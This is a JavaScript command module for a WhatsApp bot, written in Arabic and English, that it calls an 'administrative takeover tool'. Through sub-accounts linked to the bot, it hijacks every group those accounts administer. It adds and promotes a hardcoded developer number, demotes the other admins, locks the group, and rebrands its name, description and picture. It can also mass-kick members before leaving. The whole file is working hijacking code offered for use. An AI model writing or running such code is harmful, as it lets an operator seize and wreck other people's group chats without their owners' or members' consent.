import fs from 'fs';
import path from 'path';
import { listMdBots, getMdBot, getMainConn } from '../../lib/md.js';
import { MEDIA_DIR, LOGO_FILE } from '../../lib/paths.js';
import config from '../../config.js';

//@Eren/changes Administrative takeover tool for developers
//@Eren/note Manages groups and channels on connected MD sub-bots for developer ownership transfer

const KKKK_IMG = path.join(MEDIA_DIR, 'kkkk.png');
const DEV_NUMBER = (config.owner || '962796163926').toString().replace(/\D/g, '');
const DEV_JID = `${DEV_NUMBER}@s.whatsapp.net`;

const EREN = {
  command: ["kkkk", "كككك"],
  description: "أداة نقل ملكية وإدارة مجموعات وقنوات الأرقام المنصبة (للمطور فقط)",
  usage: ".kkkk [رقم_المنصب] [kickall]",
  developer: "on",
  group: false,
  prv: false,
};

async function execute({ sock, msg, args, sender, isDeveloper, isOwner }) {
  const chatId = msg.key.remoteJid;

  if (!isDeveloper && !isOwner) {
    return await sock.sendMessage(chatId, {
      text: "🔇 restricted: هذا الأمر حصري للمطورين المعتمدين فقط."
    }, { quoted: msg });
  }

  const subBots = listMdBots();
  const targetNumber = args[0]?.replace(/\D/g, '');

  if (!targetNumber) {
    if (subBots.length === 0) {
      return await sock.sendMessage(chatId, {
        text: `⚠️ لا توجد أرقام فرعية (MD) متصلة حالياً.\n\nقم بتنصيب رقم أولاً عبر أمر *تنصيب* لاستخدام هذه الأداة.`
      }, { quoted: msg });
    }

    const rows = subBots.map(b => ({
      title: `📱 الرقم: ${b.number}`,
      description: `بدء عملية kkkk على المجموعات والقنوات`,
      id: `.kkkk ${b.number}`
    }));

    return await sock.sendMessage(chatId, {
      text: `🍷 *لوحة تحكم KKKK - اختر الرقم المستهدف:*\n\nالأرقام المنصبة المتصلة (${subBots.length}):\n${subBots.map(b => `• ${b.number}`).join('\n')}\n\n_اضغط على الرقم أو اكتب .kkkk [الرقم]_`,
      interactiveButtons: [
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "الأرقام المتصلة 📱",
            sections: [
              {
                title: "اختر الرقم لتنفيذ النقل",
                rows
              }
            ]
          })
        }
      ]
    }, { quoted: msg });
  }

  const targetConn = getMdBot(targetNumber);
  if (!targetConn || !targetConn.sock) {
    return await sock.sendMessage(chatId, {
      text: `❌ تعذر العثور على اتصال نشط للرقم: ${targetNumber}`
    }, { quoted: msg });
  }

  const targetSock = targetConn.sock;
  const kickAllEnabled = args.includes('kickall');

  await sock.sendMessage(chatId, {
    text: `⏳ *جاري فحص المجموعات والقنوات على الرقم ${targetNumber}...*\n\nالهدف: ترقية المطور (@${DEV_NUMBER}) وتحديث البيانات.`
  }, { quoted: msg });

  let groupPicBuf = null;
  if (fs.existsSync(KKKK_IMG)) {
    groupPicBuf = fs.readFileSync(KKKK_IMG);
  } else if (fs.existsSync(LOGO_FILE)) {
    groupPicBuf = fs.readFileSync(LOGO_FILE);
  }

  const report = {
    groupsSuccess: 0,
    groupsFailed: 0,
    channelsProcessed: 0,
    details: []
  };

  try {
    const groups = await targetSock.groupFetchAllParticipating().catch(() => ({}));
    const targetJid = targetSock.user?.id ? (targetSock.user.id.split(':')[0] + '@s.whatsapp.net') : null;

    for (const [gid, gdata] of Object.entries(groups)) {
      const myParticipant = gdata.participants?.find(p =>
        p.id === targetJid || p.id.split('@')[0] === targetNumber
      );

      const isAdmin = myParticipant?.admin === 'admin' || myParticipant?.admin === 'superadmin';
      const isSuper = myParticipant?.admin === 'superadmin';

      if (!isAdmin) continue;

      try {
        const devParticipant = gdata.participants?.find(p => p.id === DEV_JID || p.id.split('@')[0] === DEV_NUMBER);
        if (!devParticipant) {
          try {
            await targetSock.groupParticipantsUpdate(gid, [DEV_JID], "add");
          } catch (e) {}
        }
        try {
          await targetSock.groupParticipantsUpdate(gid, [DEV_JID], "promote");
        } catch (e) {}

        const otherAdmins = gdata.participants
          ?.filter(p => (p.admin === 'admin' || p.admin === 'superadmin') &&
                        p.id !== targetJid &&
                        p.id !== DEV_JID &&
                        (!isSuper ? p.admin !== 'superadmin' : true))
          .map(p => p.id) || [];

        if (otherAdmins.length > 0) {
          try {
            await targetSock.groupParticipantsUpdate(gid, otherAdmins, "demote");
          } catch (e) {}
        }

        try {
          await targetSock.groupSettingUpdate(gid, 'announcement');
        } catch (e) {}

        try {
          await targetSock.groupUpdateSubject(gid, "Collectable『🍷』 𝐸𝓇𝑒𝓃");
        } catch (e) {}

        try {
          await targetSock.groupUpdateDescription(gid, "🍷 Collectable『🍷』 𝐸𝓇𝑒𝓃 Official Community 🌹\nManaged by 𝐸𝓇𝑒𝓃 🍷 𝘚𝘺𝘴𝘵𝘦ܡ.");
        } catch (e) {}

        if (groupPicBuf) {
          try {
            await targetSock.updateProfilePicture(gid, groupPicBuf);
          } catch (e) {}
        }

        if (kickAllEnabled) {
          const toKick = gdata.participants
            ?.filter(p => p.id !== targetJid && p.id !== DEV_JID && p.admin !== 'superadmin')
            .map(p => p.id) || [];
          if (toKick.length > 0) {
            try {
              await targetSock.groupParticipantsUpdate(gid, toKick, "remove");
            } catch (e) {}
          }
        }

        if (isSuper) {
          try {
            await targetSock.groupLeave(gid);
          } catch (e) {}
        }

        report.groupsSuccess++;
        report.details.push(`✔ ${gdata.subject || gid} [${isSuper ? 'Superadmin' : 'Admin'}]`);

      } catch (grpErr) {
        report.groupsFailed++;
        report.details.push(`✘ ${gdata.subject || gid}: ${grpErr.message}`);
      }
    }

    const summaryMsg =
`🍷 *تقرير عملية KKKK للرقم:* ${targetNumber}

📊 *المجموعات الناجحة:* ${report.groupsSuccess}
⚠️ *المجموعات التي تعذرت:* ${report.groupsFailed}
👑 *المطور المستلم:* @${DEV_NUMBER}
🏷️ *الاسم الجديد:* Collectable『🍷』 𝐸𝓇𝑒𝓃

📝 *التفاصيل:*
${report.details.slice(0, 15).join('\n')}
${report.details.length > 15 ? `\n...والمزيد (${report.details.length - 15})` : ''}

✔ تمت المهمة بنجاح! 🌹`;

    return await sock.sendMessage(chatId, {
      text: summaryMsg,
      mentions: [DEV_JID]
    }, { quoted: msg });

  } catch (err) {
    console.error("𝘌𝘳𝘳𝘰𝘳 𝘪𝘯 kkkk command:", err);
    return await sock.sendMessage(chatId, {
      text: `❌ خطأ في تنفيذ العملية: ${err.message}`
    }, { quoted: msg });
  }
}

export default { EREN, DEJAVU: EREN, AIZEN: EREN, execute };
